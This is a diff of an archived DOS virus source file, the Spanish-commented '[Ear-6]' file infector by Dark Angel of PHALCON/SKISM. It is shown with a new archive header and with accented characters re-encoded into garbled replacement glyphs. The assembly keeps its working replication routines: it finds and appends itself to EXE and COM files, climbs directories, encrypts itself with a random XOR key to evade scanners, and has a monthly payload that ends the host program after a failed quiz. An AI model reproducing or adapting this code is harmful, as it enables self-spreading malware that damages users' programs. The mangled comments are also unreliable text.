@@ -1,31 +1,42 @@
+; ------------------------------------------------------------
+; name      E
+; type      asm
+; cve       ‚Äî
+; year      unknown
+; os        DOS
+; authors   unknown
+; source    krisyotam
+; archived  krisyotam (2026)
+; notes     ‚Äî
+; ------------------------------------------------------------
 ; [Ear-6]
 
-; El virus de oreja y o°do seis
+; El virus de oreja y oÔøΩdo seis
 ; Fue escrito por Dark Angel de PHALCON/SKISM
-; Yo (el †ngel oscuro) escrib° este programa hace muchas semanas.
+; Yo (el ÔøΩngel oscuro) escribÔøΩ este programa hace muchas semanas.
 ; No deba modificar este programa y da a otras personas COMO SI
-; estar† el suyo.
+; estarÔøΩ el suyo.
 
-; ®D¢nde est† mi llama, mama?
+; ÔøΩDÔøΩnde estÔøΩ mi llama, mama?
 
 ;                       diccionarito
-; espa§ol       inglÇs                   magnitud      size
+; espaÔøΩol       inglÔøΩs                   magnitud      size
 ; abre          open                     mango         handle
-; aprueba       pass (a test)            m†scara       mask
+; aprueba       pass (a test)            mÔøΩscara       mask
 ; atras         back                     mensaje       message
 ; azado         random                   mes           month
-; busca         find                     mont¢n        heap
-; cierra        close                    oreja, o°do   ear
+; busca         find                     montÔøΩn        heap
+; cierra        close                    oreja, oÔøΩdo   ear
 ; cifra         code, encrypt, decrypt   pila          stack
 ; codo          pointer                  pregunta      question
 ; corto         terse, short             primer        first
 ; empieza       begin                    remendar      patch
 ; escriba       write                    renuncia      reject
-; espa§ol       inglÇs                   respuesta     answer
+; espaÔøΩol       inglÔøΩs                   respuesta     answer
 ; fecha         date                     salta         exit
 ; ficha         file                     siguiente     following, next
-; °ndice        table                    suspende      fail (a test)
-; ®le gusta?    do you like?             termina       end
+; ÔøΩndice        table                    suspende      fail (a test)
+; ÔøΩle gusta?    do you like?             termina       end
 ; longitud      length                   virus         virus (!)
 
 .model tiny
@@ -35,7 +46,7 @@ org     100h
 longitud_del_virus = TerminaVir - EmpezarVir
 longitud_del_escribir = offset termina_escribir - offset escribir
 
-id = 'GH'                                       ; Representa el l°der de
+id = 'GH'                                       ; Representa el lÔøΩder de
                                                 ; PHALCON/SKISM, Garbageheap
 Empezar:  db      0e9h, 0, 0                    ; jmp EmpezarVir
 
@@ -45,7 +56,7 @@ remendar1:
         mov     bx, offset EmpezarCifra
 remendar2:
         mov     cx, ((longitud_del_virus + 1) / 2)
-hacia_atras:    ; atr†s
+hacia_atras:    ; atrÔøΩs
         db      2eh
 remendar3:
         db      81h, 37h, 0, 0                  ; xor word ptr cs:[bx], 0
@@ -61,7 +72,7 @@ siguiente:
         mov     byte ptr [bp+numinf], 0
 
         cld                                     ; No es necessario, pero
-                                                ; ®por quÇ no?
+                                                ; ÔøΩpor quÔøΩ no?
         cmp     sp, id
         jz      SoyEXE
 SoyCOM: mov     di, 100h
@@ -84,7 +95,7 @@ SoyEXE: push    ds
 
         jmp     short SoyNada
 
-NombreDelVirus  db  0,'[Ear-6]',0               ; En inglÇs, ≠por supuesto!
+NombreDelVirus  db  0,'[Ear-6]',0               ; En inglÔøΩs, ÔøΩpor supuesto!
 NombreDelAutor  db  'Dark Angel',0
 
 SoyNada:
@@ -103,17 +114,17 @@ SoyNada:
         int     21h
 
 looper:
-        lea     dx, [bp+offset mascara1]        ; "m†scara", no "mascara"
+        lea     dx, [bp+offset mascara1]        ; "mÔøΩscara", no "mascara"
         call    infectar_mascara                ; pero no es possible usar
                                                 ; acentos en MASM/TASM.
-                                                ; ≠QuÇ l†stima!
+                                                ; ÔøΩQuÔøΩ lÔøΩstima!
                                                 ; mascara1 es '*.EXE',0
         lea     dx, [bp+offset mascara2]        ; mascara2 es '*.COM',0
         call    infectar_mascara                ; infecta las fichas de COM
 
-        cmp     byte ptr [bp+numinf], 5         ; ®Ha infectada cinco fichas?
+        cmp     byte ptr [bp+numinf], 5         ; ÔøΩHa infectada cinco fichas?
         jg      saltar                          ; Si es verdad, no necesita
-                                                ; busca m†s fichas.
+                                                ; busca mÔøΩs fichas.
         mov     ah, 3bh                         ; Cambia el directorio al
         lea     dx, [bp+puntos]                 ; directorio anterior
         int     21h                             ; ('..', 'punto punto')
@@ -126,19 +137,19 @@ saltar: lea     dx, [bp+backslash]              ; Cambia el directorio al
         mov     ah, 2ah                         ; Activa el primer de
         int     21h                             ; cada mes
         cmp     dl, 1                           ; Si no es el primer,
-        jnz     saltarahora                     ; ≠saltar ahora! (duh-o)
+        jnz     saltarahora                     ; ÔøΩsaltar ahora! (duh-o)
 
-        mov     ah, 2ch                         ; ®QuÇ hora es?
+        mov     ah, 2ch                         ; ÔøΩQuÔøΩ hora es?
         int     21h
 
         cmp     dl, 85                          ; 85% probabilidad de
-        jg      saltarahora                     ; activaci¢n
+        jg      saltarahora                     ; activaciÔøΩn
 
-        and     dx, 7                           ; Un n£mero quasi-azado
+        and     dx, 7                           ; Un nÔøΩmero quasi-azado
         shl     dl, 1                           ; Usalo para determinar
-        mov     bx, bp                          ; que preguntar† la virus
+        mov     bx, bp                          ; que preguntarÔøΩ la virus
         add     bx, dx
-        mov     dx, word ptr [bx+indice]        ; °ndice para el examencito
+        mov     dx, word ptr [bx+indice]        ; ÔøΩndice para el examencito
         add     dx, bp
         inc     dx
         push    dx                              ; Salva el codo al pregunta
@@ -148,16 +159,16 @@ saltar: lea     dx, [bp+backslash]              ; Cambia el directorio al
         int     21h
 
         pop     dx                              ; Escriba el parte de la oreja
-        int     21h                             ; o el o°do
+        int     21h                             ; o el oÔøΩdo
         dec     dx
         push    dx                              ; Salva la respuesta correcta
 
         lea     dx, [bp+secciones]              ; Escriba los secciones de la
-        int     21h                             ; oreja y el o°do
+        int     21h                             ; oreja y el oÔøΩdo
 
 trataotrarespuesta:
         mov     ah, 7                           ; Obtiene la respuesta de la
-        int     21h                             ; "v°ctima"
+        int     21h                             ; "vÔøΩctima"
         cmp     al, '1'                         ; Necesita una respuesta de
         jl      trataotrarespuesta              ; uno hasta tres
         cmp     al, '3'                         ; Renuncia otras respuestas
@@ -169,14 +180,14 @@ trataotrarespuesta:
                                                 ; correcta
         mov     ah, 9                           ; Prepara a escribir un
                                                 ; mensaje
-        cmp     al, byte ptr [bx]               ; ®Es correcta?
-        jz      saltarapidamente                ; êl aprueba el examencito.
-                                                ; Pues, salta r†pidamente.
-        lea     dx, [bp+suspendido]             ; Lo siento, pero ≠Ud. no
-        int     21h                             ; aprueba el examencito f†cil!
+        cmp     al, byte ptr [bx]               ; ÔøΩEs correcta?
+        jz      saltarapidamente                ; ÔøΩl aprueba el examencito.
+                                                ; Pues, salta rÔøΩpidamente.
+        lea     dx, [bp+suspendido]             ; Lo siento, pero ÔøΩUd. no
+        int     21h                             ; aprueba el examencito fÔøΩcil!
 
-        mov     ah, 4ch                         ; Estudie m†s y el programa
-        jmp     quite                           ; permitir† a Ud a continuar.
+        mov     ah, 4ch                         ; Estudie mÔøΩs y el programa
+        jmp     quite                           ; permitirÔøΩ a Ud a continuar.
 
 saltarapidamente:
         lea     dx, [bp+aprueba]
@@ -185,7 +196,7 @@ saltarahora:
         mov     ah, 1ah                         ; Restaura el DTA original
         mov     dx, 80h
 quite:
-        cmp     sp, id - 4                      ; ®Es EXE o COM?
+        cmp     sp, id - 4                      ; ÔøΩEs EXE o COM?
         jz      vuelvaEXE
 vuelvaCOM:
         int     21h                             ; Restaura el DTA y vuelva
@@ -232,15 +243,15 @@ brb_brb:
 
         lea     si,[bp+nuevoDTA+15h]            ; Salva cosas sobre la ficha
         lea     di,[bp+f_atrib]                 ; Por ejemplo, la fecha de
-        mov     cx, 9                           ; creaci¢n
+        mov     cx, 9                           ; creaciÔøΩn
         rep     movsb
 
-        cmp     word ptr [bp+buffer], 'ZM'      ; ®Es EXE o COM?
+        cmp     word ptr [bp+buffer], 'ZM'      ; ÔøΩEs EXE o COM?
         jz      buscaEXE
 buscaCOM:
-        mov     ax, word ptr [bp+f_long]        ; ®Cuan grande es la ficha?
+        mov     ax, word ptr [bp+f_long]        ; ÔøΩCuan grande es la ficha?
         sub     ax, longitud_del_virus + 3      ; Adjusta para el JMP
-        cmp     ax, word ptr [bp+buffer+1]      ; ®Ya es infectada?
+        cmp     ax, word ptr [bp+buffer+1]      ; ÔøΩYa es infectada?
         jnz     infecta_mi_burro                ; "infect my ass"
         jmp     short BuscaMas
 buscaEXE:
@@ -249,7 +260,7 @@ buscaEXE:
 BuscaMas:
         mov     ah, 4fh                         ; Busca otra ficha...
         jmp     short brb_brb
-hasta_la_vista_bebe:                            ; ®Le gusta Arnold?
+hasta_la_vista_bebe:                            ; ÔøΩLe gusta Arnold?
         ret
 
 infecta_mi_burro:
@@ -281,7 +292,7 @@ InfectaEXE:
         mov     word ptr [bp+EXE_Donde_JMP2], ax; CS:IP de la ficha infectada
         mov     word ptr [bp+EXE_Donde_JMP2+2], es
 
-        les     ax, [si+0Eh]                    ; Salva la original locaci¢n
+        les     ax, [si+0Eh]                    ; Salva la original locaciÔøΩn
         mov     word ptr [bp+PilaOriginal2], es ; de la pila
         mov     word ptr [bp+PilaOriginal2+2], ax
 
@@ -313,7 +324,7 @@ InfectaEXE:
         pop     dx                              ; Restaura el magnitud de
         pop     ax                              ; la ficha
 
-        add     ax, longitud_del_virus          ; A§ada el magnitud del virus
+        add     ax, longitud_del_virus          ; AÔøΩada el magnitud del virus
         adc     dx, 0
         mov     cl, 9
         push    ax
@@ -348,11 +359,11 @@ TerminaInfeccion:
         cwd                                     ; xor dx,dx
         int     21h
 
-        mov     ah, 2ch                         ; N£meros azados en CX y DX
+        mov     ah, 2ch                         ; NÔøΩmeros azados en CX y DX
         int     21h
-        mov     word ptr [bp+remendar3+2], cx   ; Es el nuevo n£mero de la
+        mov     word ptr [bp+remendar3+2], cx   ; Es el nuevo nÔøΩmero de la
                                                 ; cifra
-        and     cx, 31                          ; Pone un n£mero azado para el
+        and     cx, 31                          ; Pone un nÔøΩmero azado para el
         add     cx, ((longitud_del_virus + 1) / 2); magnitud de la ficha.  Por
                                                 ; eso, los scanners necesitan
         mov     word ptr [bp+remendar2+1], cx   ; usar "wildcards"
@@ -370,7 +381,7 @@ TerminaInfeccion:
         stosb                                   ; (recuerda mango de la ficha)
 
         lea     si, [bp+escribir]               ; Copia las instrucciones
-        mov     cx, longitud_del_escribir       ; para a§ada el virus a la
+        mov     cx, longitud_del_escribir       ; para aÔøΩada el virus a la
         rep     movsb                           ; ficha
 
         mov     al, 53h                         ; push bx
@@ -438,7 +449,7 @@ secciones db    ' located?',13,10
 suspendido db   13,10,'You obviously know nothing about ears.'
         db      13,10,'Try again after some study.',13,10,'$'
 
-; ≠Espero que s°!
+; ÔøΩEspero que sÔøΩ!
 aprueba db      13,10,'Wow, you know your ears!  Please resume work.',13,10
         db      '$'
 
@@ -453,7 +464,7 @@ backslash db '\'
 
 TerminaVir = $
 
-; Los que sigue son en el mont¢n...
+; Los que sigue son en el montÔøΩn...
 longitud_de_la_cifra = offset EmpezarCifra - offset shwing
 
 diroriginal db 64 dup (?)
@@ -461,15 +472,15 @@ tempo       dw ?
 nuevoDTA    db 43 dup (?)
 numinf      db ?
 antes_del_tempstore:
-; tempstore es el buffer para el parte del programa que a§ada el virus al fin
+; tempstore es el buffer para el parte del programa que aÔøΩada el virus al fin
 ; de otro programa
 tempstore   db (longitud_de_la_cifra*2+longitud_del_escribir+5) dup (?)
-                                                ; a§ada cinco para los pop,
+                                                ; aÔøΩada cinco para los pop,
                                                 ; los push, y el retn
 buffer      db 1ah dup (?)
 f_atrib     db      ?                           ; atributo de la ficha
-f_hora      dw      ?                           ; hora de creaci¢n
-f_fecha     dw      ?                           ; fecha de creaci¢n
+f_hora      dw      ?                           ; hora de creaciÔøΩn
+f_fecha     dw      ?                           ; fecha de creaciÔøΩn
 f_long      dd      ?                           ; magnitud de la ficha
 
         end     Empezar
